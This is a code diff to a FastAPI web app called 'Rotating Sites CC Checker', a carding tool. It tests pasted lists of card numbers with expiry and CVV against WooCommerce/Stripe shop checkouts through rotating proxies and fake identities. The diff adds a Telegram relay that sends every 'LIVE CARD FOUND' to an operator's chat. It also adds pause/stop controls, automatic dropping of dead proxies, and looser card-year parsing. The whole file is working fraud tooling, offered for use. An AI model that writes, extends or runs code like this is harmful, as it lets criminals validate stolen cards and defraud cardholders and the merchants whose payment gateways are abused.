@@ -12,7 +12,7 @@ import uuid
 from dataclasses import dataclass, field
 from typing import Any
 
-from fastapi import FastAPI
+from fastapi import FastAPI, Query
 from fastapi.responses import HTMLResponse
 from curl_cffi.requests import AsyncSession
 from faker import Faker
@@ -23,7 +23,7 @@ logging.basicConfig(
 )
 logger = logging.getLogger("ollie.rotating.checker")
 
-app = FastAPI(title="Rotating Sites CC Checker (Astra + Rollerco)", version="6.2.0")
+app = FastAPI(title="Rotating Sites CC Checker with Telegram & Pause/Stop", version="7.0.0")
 
 RAW_DORK_GATES: dict[str, dict[str, str]] = {
     "astra_store": {
@@ -41,8 +41,6 @@ RAW_DORK_GATES: dict[str, dict[str, str]] = {
         "engine": "woocommerce_stripe",
     },
 }
-
-CLEAN_GATE_CACHE: list[str] = list(RAW_DORK_GATES.keys())
 
 fake = Faker("en_US")
 Faker.seed()
@@ -82,7 +80,7 @@ class AuthVerdict:
     latency_ms: float = 0.0
     bin_info: dict[str, str] = field(default_factory=dict)
     target_used: str = ""
-    waf_status: str = "CLEAN (No CF/Captcha)"
+    waf_status: str = "CLEAN"
     card_masked: str | None = None
     proxy_used: str | None = None
 
@@ -124,10 +122,12 @@ def universal_card_formatter(raw_line: str) -> tuple[str, str, str, str] | None:
         mm = parts[1].zfill(2)
         yy = parts[2]
         cvv = parts[3]
-        yy = yy if len(yy) == 4 else "20" + yy[-2:]
+        # Suporta ang 2-digit at 4-digit YYYY
+        if len(yy) == 4:
+            yy = yy[-2:]
         if cc.isdigit() and mm.isdigit() and yy.isdigit() and cvv.isdigit():
             if verify_luhn(cc) and (1 <= int(mm) <= 12):
-                return cc, mm, yy[-2:], cvv
+                return cc, mm, yy, cvv
 
     numbers = re.findall(r"\d+", clean)
     if not numbers:
@@ -494,6 +494,19 @@ async def check_card_endpoint(
     return verdict.to_dict()
 
 
+@app.get("/api/telegram/send")
+async def send_telegram_alert(token: str = Query(...), chat_id: str = Query(...), message: str = Query(...)) -> dict[str, Any]:
+    tg_url = f"https://api.telegram.org/bot{token}/sendMessage"
+    try:
+        async with AsyncSession(verify=False) as session:
+            resp = await session.post(tg_url, data={"chat_id": chat_id, "text": message}, timeout=10)
+            if resp.status_code == 200:
+                return {"success": True}
+    except Exception:
+        pass
+    return {"success": False}
+
+
 @app.get("/", response_class=HTMLResponse)
 async def index() -> str:
     return """<!DOCTYPE html>
@@ -501,7 +514,7 @@ async def index() -> str:
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
-    <title>Rotating Sites CC Checker (Astra + Rollerco)</title>
+    <title>Rotating Sites CC Checker (Telegram + Pause/Stop)</title>
     <script src="https://cdn.tailwindcss.com"></script>
 </head>
 <body class="bg-slate-950 text-white min-h-screen p-6">
@@ -509,7 +522,7 @@ async def index() -> str:
         <div class="flex flex-wrap items-center justify-between border-b border-slate-800 pb-4 gap-2">
             <div>
                 <h1 class="text-2xl font-bold text-emerald-400">Rotating Sites CC Checker</h1>
-                <p class="text-xs text-slate-400 font-mono">Astra Store & Rollerco Gateway Rotator</p>
+                <p class="text-xs text-slate-400 font-mono">Astra Store & Rollerco Gateway + Telegram Auto-Sender</p>
             </div>
             <div class="flex gap-2">
                 <button onclick="autoFormatCards()" class="text-xs bg-violet-900/70 hover:bg-violet-800 text-violet-200 border border-violet-700 px-3 py-1.5 rounded-lg transition font-semibold">
@@ -542,20 +555,39 @@ async def index() -> str:
                 </div>
             </div>
 
-            <div class="space-y-2">
-                <div class="flex justify-between items-center">
-                    <label class="text-xs font-medium text-slate-400">Proxy List (host:port:user:pass or http://...)</label>
-                    <button onclick="checkAndPruneProxies()" class="bg-blue-600 hover:bg-blue-500 px-3 py-1 rounded text-xs font-semibold transition">
-                        Test & Auto-Prune Dead Proxies
-                    </button>
+            <!-- Telegram Config Box -->
+            <div class="grid grid-cols-1 md:grid-cols-2 gap-4 bg-slate-950 p-3 rounded-lg border border-slate-800">
+                <div>
+                    <label class="block text-xs font-medium text-slate-400 mb-1">Telegram Bot Token</label>
+                    <input id="tgToken" type="text" placeholder="123456789:ABCdefGhIJKlmNoPQRsTUVwxyZ" class="w-full bg-slate-900 border border-slate-700 rounded-lg p-2 text-xs font-mono">
                 </div>
-                <textarea id="proxyInput" rows="3" placeholder="proxy_host:port:user:pass"
-                    class="w-full bg-slate-950 border border-slate-700 rounded-lg p-3 text-xs font-mono focus:ring-2 focus:ring-emerald-500 focus:outline-none"></textarea>
+                <div>
+                    <label class="block text-xs font-medium text-slate-400 mb-1">Telegram Chat ID</label>
+                    <input id="tgChatId" type="text" placeholder="-1001234567890 o ID" class="w-full bg-slate-900 border border-slate-700 rounded-lg p-2 text-xs font-mono">
+                </div>
+            </div>
+
+            <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+                <div class="space-y-2">
+                    <div class="flex justify-between items-center">
+                        <label class="text-xs font-medium text-slate-400">Live Proxies Box</label>
+                        <button onclick="checkAndPruneProxies()" class="bg-blue-600 hover:bg-blue-500 px-3 py-1 rounded text-xs font-semibold transition">
+                            Test & Auto-Prune (Drop Dead)
+                        </button>
+                    </div>
+                    <textarea id="proxyInput" rows="4" placeholder="host:port:user:pass"
+                        class="w-full bg-slate-950 border border-emerald-900/50 rounded-lg p-3 text-xs font-mono focus:outline-none text-emerald-300"></textarea>
+                </div>
+                <div class="space-y-2">
+                    <label class="text-xs font-medium text-rose-400">Dead Proxies Box (Auto-Dropped)</label>
+                    <textarea id="deadProxyInput" rows="4" readonly placeholder="Dito mapupunta ang mga dead proxies..."
+                        class="w-full bg-slate-950 border border-rose-900/50 rounded-lg p-3 text-xs font-mono focus:outline-none text-rose-400"></textarea>
+                </div>
             </div>
 
             <div class="space-y-2">
-                <label class="block text-xs font-medium text-slate-400">Cards List (CC|MM|YY|CVV)</label>
-                <textarea id="cardInput" rows="4" placeholder="489504...|10|2027|254"
+                <label class="block text-xs font-medium text-slate-400">Cards List (Supports YY or YYYY)</label>
+                <textarea id="cardInput" rows="4" placeholder="489504...|10|2027|254 o 489504...|10|27|254"
                     class="w-full bg-slate-950 border border-slate-700 rounded-lg p-3 text-xs font-mono focus:ring-2 focus:ring-emerald-500 focus:outline-none"></textarea>
             </div>
 
@@ -578,10 +610,21 @@ async def index() -> str:
                 </div>
             </div>
 
-            <button id="checkButton" onclick="runBatchChecker()"
-                class="bg-emerald-600 hover:bg-emerald-500 px-5 py-3 rounded-lg font-semibold w-full transition shadow-lg shadow-emerald-950/50">
-                Start Rotating Card Check
-            </button>
+            <!-- Control Buttons: Start, Pause, Stop -->
+            <div class="flex gap-3">
+                <button id="checkButton" onclick="runBatchChecker()"
+                    class="bg-emerald-600 hover:bg-emerald-500 px-5 py-3 rounded-lg font-semibold flex-1 transition shadow-lg shadow-emerald-950/50">
+                    Start Checking
+                </button>
+                <button id="pauseButton" onclick="togglePause()" disabled
+                    class="bg-amber-600 hover:bg-amber-500 px-5 py-3 rounded-lg font-semibold transition disabled:opacity-50">
+                    Pause
+                </button>
+                <button id="stopButton" onclick="stopChecker()" disabled
+                    class="bg-rose-600 hover:bg-rose-500 px-5 py-3 rounded-lg font-semibold transition disabled:opacity-50">
+                    Stop
+                </button>
+            </div>
 
             <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
                 <div>
@@ -596,6 +639,9 @@ async def index() -> str:
         </div>
     </main>
     <script>
+    let isPaused = false;
+    let isStopped = false;
+
     const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
     function playTone(type) {
         if (audioCtx.state === 'suspended') audioCtx.resume();
@@ -660,15 +706,34 @@ async def index() -> str:
         a.click();
     }
 
+    function togglePause() {
+        isPaused = !isPaused;
+        const btn = document.getElementById("pauseButton");
+        btn.textContent = isPaused ? "Resume" : "Pause";
+        btn.className = isPaused ? "bg-emerald-600 hover:bg-emerald-500 px-5 py-3 rounded-lg font-semibold transition" : "bg-amber-600 hover:bg-amber-500 px-5 py-3 rounded-lg font-semibold transition";
+    }
+
+    function stopChecker() {
+        isStopped = true;
+        isPaused = false;
+        document.getElementById("checkButton").disabled = false;
+        document.getElementById("checkButton").textContent = "Start Checking";
+        document.getElementById("pauseButton").disabled = true;
+        document.getElementById("stopButton").disabled = true;
+        document.getElementById("pauseButton").textContent = "Pause";
+    }
+
     async function checkAndPruneProxies() {
         const deadBox = document.getElementById("deadBox");
         const proxyTa = document.getElementById("proxyInput");
+        const deadProxyTa = document.getElementById("deadProxyInput");
         const maxThreads = parseInt(document.getElementById("proxyThreads").value) || 50;
         const lines = proxyTa.value.split(/[\\n,]/).map(l => l.trim()).filter(Boolean);
         if (!lines.length) return alert("Paste proxies first.");
 
         deadBox.innerHTML = `Pruning ${lines.length} proxies...`;
         let liveProxies = [];
+        let deadProxies = [];
         let idx = 0;
 
         async function worker() {
@@ -677,41 +742,52 @@ async def index() -> str:
                 try {
                     const res = await fetch("/api/proxy/test?proxy=" + encodeURIComponent(current));
                     const d = await res.json();
-                    const row = document.createElement("div");
                     if (d.status === "LIVE") {
-                        row.className = "text-emerald-400";
-                        row.textContent = `[PROXY LIVE] ${current} -> IP: ${d.ip} (${d.latency_ms}ms)`;
                         liveProxies.push(current);
                     } else {
-                        row.className = "text-rose-400";
-                        row.textContent = `[PROXY DEAD] ${current}`;
+                        deadProxies.push(current);
                     }
-                    deadBox.appendChild(row);
                 } catch (e) {
-                    const row = document.createElement("div");
-                    row.className = "text-rose-400";
-                    row.textContent = `[PROXY ERR] ${current}`;
-                    deadBox.appendChild(row);
+                    deadProxies.push(current);
                 }
             }
         }
         await Promise.all(Array.from({ length: Math.min(maxThreads, lines.length) }, () => worker()));
         proxyTa.value = liveProxies.join("\\n");
+        deadProxyTa.value = deadProxies.join("\\n");
+        deadBox.innerHTML = `<div class="text-emerald-400 font-bold">Proxy Prune Done: ${liveProxies.length} Live, ${deadProxies.length} Dead (Auto-dropped).</div>`;
+    }
+
+    async function sendTelegram(token, chatId, text) {
+        if (!token || !chatId) return;
+        try {
+            await fetch(`/api/telegram/send?token=${encodeURIComponent(token)}&chat_id=${encodeURIComponent(chatId)}&message=${encodeURIComponent(text)}`);
+        } catch (e) {}
     }
 
     async function runBatchChecker() {
         const btn = document.getElementById("checkButton");
+        const pauseBtn = document.getElementById("pauseButton");
+        const stopBtn = document.getElementById("stopButton");
         const liveBox = document.getElementById("liveBox");
         const deadBox = document.getElementById("deadBox");
         const bar = document.getElementById("progressBar");
         const target = document.getElementById("targetSelect").value;
         const maxThreads = parseInt(document.getElementById("cardThreads").value) || 5;
 
+        const tgToken = document.getElementById("tgToken").value.trim();
+        const tgChatId = document.getElementById("tgChatId").value.trim();
+
         const cards = document.getElementById("cardInput").value.split("\\n").map(l => l.trim()).filter(Boolean);
         const proxies = document.getElementById("proxyInput").value.split(/[\\n,]/).map(l => l.trim()).filter(Boolean);
         if (!cards.length) return alert("Paste cards first.");
 
         btn.disabled = true;
+        pauseBtn.disabled = false;
+        stopBtn.disabled = false;
+        isStopped = false;
+        isPaused = false;
+
         let live = 0, dead = 0, checked = 0;
         document.getElementById("liveCount").textContent = "0";
         document.getElementById("deadCount").textContent = "0";
@@ -729,7 +805,12 @@ async def index() -> str:
         const total = pairs.length;
 
         async function cardWorker() {
-            while (idx < total) {
+            while (idx < total && !isStopped) {
+                while (isPaused && !isStopped) {
+                    await new Promise(r => setTimeout(r, 500));
+                }
+                if (isStopped) break;
+
                 const pair = pairs[idx++];
                 try {
                     let url = `/api/auth/check?card=${encodeURIComponent(pair.card)}&target=${encodeURIComponent(target)}`;
@@ -753,6 +834,9 @@ async def index() -> str:
                         document.getElementById("liveCount").textContent = String(live);
                         liveBox.appendChild(row);
                         playTone('live');
+                        if (tgToken && tgChatId) {
+                            sendTelegram(tgToken, tgChatId, `🔥 LIVE CARD FOUND 🔥\\n${line}`);
+                        }
                     } else {
                         dead++;
                         document.getElementById("deadCount").textContent = String(dead);
@@ -775,8 +859,7 @@ async def index() -> str:
         btn.textContent = `Running Check (${workers} threads)...`;
         await Promise.all(Array.from({ length: workers }, () => cardWorker()));
 
-        btn.disabled = false;
-        btn.textContent = "Start Rotating Card Check";
+        stopChecker();
         bar.style.width = "100%";
     }
     </script>
